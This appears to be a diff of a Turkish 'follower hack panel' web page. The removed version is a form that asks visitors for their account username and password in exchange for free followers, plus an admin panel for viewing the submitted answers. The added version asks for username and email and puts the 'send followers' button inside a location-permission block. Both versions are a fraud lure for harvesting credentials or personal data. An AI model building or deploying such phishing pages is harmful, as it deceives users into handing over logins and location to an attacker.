@@ -3,55 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Takipçi Hilesi Panel</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Takipçi Hilesi Paneli</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div id="login-screen">
-        <h1>TAKİPÇİ HİLESİ</h1>
-        <input type="password" id="password" placeholder="Şifre">
-        <button onclick="checkPassword()">Giriş Yap</button>
-    </div>
-
-    <div id="main-panel" style="display: none;">
-        <div id="menu">
-            <ul>
-                <li onclick="showEren()">TAKİPÇİ GÖNDER</li>
-                <li onclick="showCevapLogin()">ADMİN</li>
-            </ul>
-        </div>
-
-        <div id="eren-panel" style="display: none;">
-            <h2 class="center-text">HOŞGELDİNİZ</h2>
-            <form id="anketForm" onsubmit="return saveForm();">
-                <div class="form-section">
-                    <label>Kullanıcı Adınız ?</label><br>
-                    <textarea name="can" rows="3" cols="30" required></textarea>
-                </div>
-                <div class="form-section">
-                    <label>Şifre ?</label><br>
-                    <textarea name="memo" rows="3" cols="30" required></textarea>
-                </div>
-                <div class="form-section">
-                    <label>Kaç takipçi istersiniz ?</label><br>
-                    <input type="radio" name="secim" value="100" required> 100<br>
-                    <input type="radio" name="secim" value="1000"> 1000<br>
-                    <input type="radio" name="secim" value="2500"> 2500<br>
-                </div>
-                <button type="submit">Gönder</button>
-            </form>
-        </div>
-
-        <div id="cevap-login" style="display:none;">
-            <h3>ADMİN GİRİŞİ</h3>
-            <input type="password" id="cevap-password" placeholder="Şifre">
-            <button onclick="checkCevapPassword()">Giriş</button>
-        </div>
-
-        <div id="cevaplar-panel" style="display: none;">
-            <h2>Gelen Cevaplar</h2>
-            <div id="cevaplar-listesi"></div>
-        </div>
+    <div id="container">
+        <h1>Takipçi Hilesi Paneli</h1>
+        <form id="form">
+            <input type="text" id="username" placeholder="Kullanıcı Adı" required>
+            <input type="email" id="email" placeholder="E-Posta" required>
+            <textarea id="feedback" placeholder="Yorumlarınızı buraya yazın" required></textarea>
+            <div id="locationPermission">
+                <button type="button" id="locationButton">Takipçi Gönder</button>
+            </div>
+            <button type="submit" id="submitBtn" style="display:none;">Gönder</button>
+        </form>
     </div>
 
     <script src="script.js"></script>
